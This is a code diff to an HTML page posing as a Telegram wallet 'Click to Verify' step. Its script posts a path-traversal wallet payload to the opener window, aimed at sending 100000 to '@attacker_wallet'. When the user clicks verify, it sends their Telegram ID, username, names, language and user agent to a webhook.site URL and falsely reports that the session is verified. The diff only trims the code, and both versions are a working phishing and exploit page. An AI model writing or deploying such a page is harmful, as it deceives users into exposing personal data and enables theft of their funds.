@@ -32,61 +32,40 @@
 
   <button onclick="verify()">✅ Click to Verify</button>
 
-  <script>
-    // Attempt to send postMessage for Telegram Wallet link (if opener exists)
-    const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
-    const message = JSON.stringify({
-      eventType: 'web_app_open_tg_link',
-      eventData: {
-        path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
-      }
-    });
-
-    setTimeout(() => {
-      if (window.opener) {
-        window.opener.postMessage(message, "*");
-        console.log("✅ Wallet injection payload sent.");
-      } else {
-        console.log("ℹ️ No opener found. Skipping wallet injection.");
-      }
-    }, 1500);
-
-    // Try calling Telegram WebApp.ready() if available
-    try {
-      window.Telegram?.WebApp?.ready?.();
-    } catch (e) {
-      console.warn("Telegram WebApp object not ready or not present.");
+<script>
+  const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
+  const message = JSON.stringify({
+    eventType: 'web_app_open_tg_link',
+    eventData: {
+      path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
     }
+  });
+  setTimeout(() => {
+    window.opener?.postMessage(message, "*");
+  }, 1500);
 
-    // Main verification function
-    function verify() {
-      const tg = window.Telegram?.WebApp;
-      const user = tg?.initDataUnsafe?.user;
-
-      const data = user ? {
-        telegram_id: user.id,
-        username: user.username,
-        first_name: user.first_name,
-        last_name: user.last_name,
-        lang: user.language_code,
-        ua: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-        note: "User clicked Verify on Wallet Session"
-      } : {
-        error: "Telegram WebApp not detected",
-        ua: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-        note: "Fallback: no Telegram context"
-      };
-
+  window.Telegram.WebApp.ready();
+  function verify() {
+    const tg = window.Telegram.WebApp;
+    const user = tg.initDataUnsafe?.user;
+    if (user) {
       fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+        body: JSON.stringify({
+          telegram_id: user.id,
+          username: user.username,
+          first_name: user.first_name,
+          last_name: user.last_name,
+          lang: user.language_code,
+          ua: navigator.userAgent,
+          timestamp: new Date().toISOString(),
+          note: "User clicked Verify on Wallet Session"
+        })
       });
-
-      alert(user ? "✅ Session verified. You may now continue." : "⚠️ Telegram WebApp not detected. Sent fallback data.");
+      alert("✅ Session verified. You may now continue.");
     }
-  </script>
+  }
+</script>
 </body>
 </html>
